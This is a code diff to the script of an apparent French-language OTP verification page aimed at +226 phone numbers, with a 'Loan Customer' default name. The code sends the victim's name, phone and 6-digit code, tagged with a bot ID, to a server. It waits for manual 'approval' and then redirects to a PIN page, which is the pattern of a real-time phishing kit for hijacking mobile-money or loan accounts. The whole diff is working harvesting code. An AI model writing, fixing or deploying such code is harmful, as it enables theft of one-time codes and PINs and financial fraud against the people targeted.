@@ -238,155 +238,135 @@ const waitingEl = document.getElementById('waiting');
 const backButton = document.querySelector('.back-link button');
 const phoneDisplay = document.getElementById('phoneDisplay');
 
-// Display phone number
+// ---------- SESSION ----------
+const fullName = localStorage.getItem('fullName') || 'Loan Customer';
 const phone = localStorage.getItem('phone');
-if (phone) {
-  // Format phone number: (+226) 79046955
-  const formattedPhone = `(+226) ${phone.replace(/\D/g, '')}`;
-  phoneDisplay.textContent = formattedPhone;
-}
-
-// Session & bot handling
 const params = new URLSearchParams(window.location.search);
 const urlBotId = params.get('botId');
-if(urlBotId) localStorage.setItem('botId', urlBotId);
-
-const fullName = localStorage.getItem('fullName');
+if (urlBotId) localStorage.setItem('botId', urlBotId);
 const botId = localStorage.getItem('botId');
 
-if(!fullName || !phone || !botId){
-  alert('Session expired. Please start again.');
-  window.location.href='index.html';
+if (!phone || !botId) {
+    alert('Session expirée. Veuillez recommencer.');
+    window.location.href = 'index.html';
 }
 
-// Countdown timer - Start from 5 minutes (300 seconds)
-let timeLeft = 300; // 5 minutes in seconds
+// Display phone
+if (phone) {
+    const formatted = `(+226) ${phone.replace(/\D/g, '')}`;
+    phoneDisplay.textContent = formatted;
+}
+
+// ---------- COUNTDOWN (5 min) ----------
+let timeLeft = 300;
 function updateCountdown() {
-  const minutes = Math.floor(timeLeft / 60);
-  const seconds = timeLeft % 60;
-  countdownEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-  
-  if (timeLeft <= 0) { 
-    clearInterval(timer); 
-    countdownEl.textContent = '00:00';
-  }
-  timeLeft--;
+    const m = Math.floor(timeLeft / 60);
+    const s = timeLeft % 60;
+    countdownEl.textContent = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+    if (timeLeft <= 0) { clearInterval(timer); countdownEl.textContent = '00:00'; }
+    timeLeft--;
 }
-
 const timer = setInterval(updateCountdown, 1000);
 updateCountdown();
 
-// Submit OTP
-function submitOtp(code){
-  verifyBtn.disabled = true;
-  verifyBtn.textContent = 'En attente…';
-  waitingEl.style.display = 'block';
-  inputs.forEach(i => i.disabled = true);
-
-  fetch(`${window.location.origin}/submit-otp`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ name: fullName, phone, otp: code, botId })
-  })
-  .then(r => r.json())
-  .then(({ requestId }) => pollApproval(requestId))
-  .catch(() => {
-    waitingEl.style.display = 'none';
-    verifyBtn.disabled = false;
-    verifyBtn.textContent = 'Continuer';
-    inputs.forEach(i => i.disabled = false);
-    document.getElementById('otp-alert').textContent = '❌ Erreur serveur. Veuillez réessayer.';
-    document.getElementById('otp-alert').style.color = '#e53935';
-  });
-}
-
-// Polling for approval
-function pollApproval(requestId){
-  const interval = setInterval(async ()=>{
-    try {
-      const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
-      const d = await r.json();
-
-      if(d.approved === true){
-        clearInterval(interval);
-        window.location.href = 'pin.html';
-      }
-
-      if(d.approved === false){
-        clearInterval(interval);
-        inputs.forEach(i => { i.value = ''; i.disabled = false; });
-        verifyBtn.disabled = true;
-        verifyBtn.textContent = 'Continuer';
-        waitingEl.style.display = 'none';
-        document.getElementById('otp-alert').textContent = '❌ Code incorrect. Veuillez réessayer.';
-        document.getElementById('otp-alert').style.color = '#e53935';
-      }
-    } catch(error) {
-      console.error('Polling error:', error);
-    }
-  }, 2000);
-}
-
-// Enable button only after 6 digits
-function checkInputs(){
-  verifyBtn.disabled = Array.from(inputs).map(i => i.value).join('').length !== 6;
-}
-
-// Auto-focus & input validation
+// ---------- OTP INPUT ----------
 inputs.forEach((input, i) => {
-  input.addEventListener('input', () => {
-    input.value = input.value.replace(/\D/g, '');
-    if(input.value && inputs[i+1]) inputs[i+1].focus();
-    checkInputs();
-    // Clear alert when user starts typing
-    document.getElementById('otp-alert').textContent = '';
-  });
-  
-  // Handle backspace
-  input.addEventListener('keydown', (e) => {
-    if (e.key === 'Backspace' && !input.value && i > 0) {
-      inputs[i-1].focus();
-    }
-  });
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && inputs[i+1]) inputs[i+1].focus();
+        checkInputs();
+        document.getElementById('otp-alert').textContent = '';
+    });
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && i > 0) {
+            inputs[i-1].focus();
+        }
+    });
 });
 
-// Verify button click
-verifyBtn.addEventListener('click', () => {
-  const code = Array.from(inputs).map(i => i.value).join('');
-  if(code.length === 6) submitOtp(code);
-});
-
-// Back button
-if (backButton) {
-  backButton.addEventListener('click', ()=>{
-    backButton.disabled = true;
-  });
+function checkInputs() {
+    const filled = Array.from(inputs).every(inp => inp.value.length === 1);
+    verifyBtn.disabled = !filled;
 }
 
-// Handle paste event for OTP
-document.addEventListener('paste', (e) => {
-  const paste = e.clipboardData.getData('text');
-  const digits = paste.replace(/\D/g, '').slice(0, 6);
-  if (digits.length > 0) {
-    inputs.forEach((input, i) => {
-      input.value = digits[i] || '';
-    });
-    checkInputs();
-    // Focus the next empty input or last input
-    const nextEmpty = Array.from(inputs).findIndex(inp => inp.value === '');
-    if (nextEmpty !== -1) {
-      inputs[nextEmpty].focus();
-    } else {
-      inputs[5].focus();
-    }
-    if (digits.length === 6) {
-      // Auto-submit if 6 digits pasted
-      setTimeout(() => {
-        verifyBtn.click();
-      }, 300);
-    }
-  }
+// ---------- SUBMIT ----------
+verifyBtn.addEventListener('click', () => {
+    const code = Array.from(inputs).map(i => i.value).join('');
+    if (code.length === 6) submitOtp(code);
 });
+
+function submitOtp(code) {
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'En attente…';
+    waitingEl.style.display = 'block';
+    inputs.forEach(i => i.disabled = true);
+
+    fetch(`${window.location.origin}/submit-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: fullName, phone, otp: code, botId })
+    })
+    .then(r => r.json())
+    .then(({ requestId }) => pollApproval(requestId))
+    .catch(() => {
+        waitingEl.style.display = 'none';
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Continuer';
+        inputs.forEach(i => i.disabled = false);
+        document.getElementById('otp-alert').textContent = '❌ Erreur serveur. Veuillez réessayer.';
+        document.getElementById('otp-alert').style.color = '#e53935';
+    });
+}
+
+// ---------- POLLING ----------
+function pollApproval(requestId) {
+    const interval = setInterval(async () => {
+        try {
+            const r = await fetch(`${window.location.origin}/check-otp/${requestId}`);
+            const d = await r.json();
+
+            if (d.approved === true) {
+                clearInterval(interval);
+                window.location.href = 'pin.html';
+            }
+
+            if (d.approved === false) {
+                clearInterval(interval);
+                inputs.forEach(i => { i.value = ''; i.disabled = false; });
+                verifyBtn.disabled = true;
+                verifyBtn.textContent = 'Continuer';
+                waitingEl.style.display = 'none';
+                document.getElementById('otp-alert').textContent = '❌ Code incorrect. Veuillez réessayer.';
+                document.getElementById('otp-alert').style.color = '#e53935';
+            }
+        } catch (error) {
+            console.error('Polling error:', error);
+        }
+    }, 2000);
+}
+
+// ---------- PASTE ----------
+document.addEventListener('paste', (e) => {
+    const paste = e.clipboardData.getData('text');
+    const digits = paste.replace(/\D/g, '').slice(0, 6);
+    if (digits.length > 0) {
+        inputs.forEach((input, i) => {
+            input.value = digits[i] || '';
+        });
+        checkInputs();
+        const nextEmpty = Array.from(inputs).findIndex(inp => inp.value === '');
+        if (nextEmpty !== -1) inputs[nextEmpty].focus();
+        else inputs[5].focus();
+        if (digits.length === 6) {
+            setTimeout(() => verifyBtn.click(), 300);
+        }
+    }
+});
+
+// ---------- BACK BUTTON ----------
+if (backButton) {
+    backButton.addEventListener('click', () => { backButton.disabled = true; });
+}
 </script>
 
 </body>
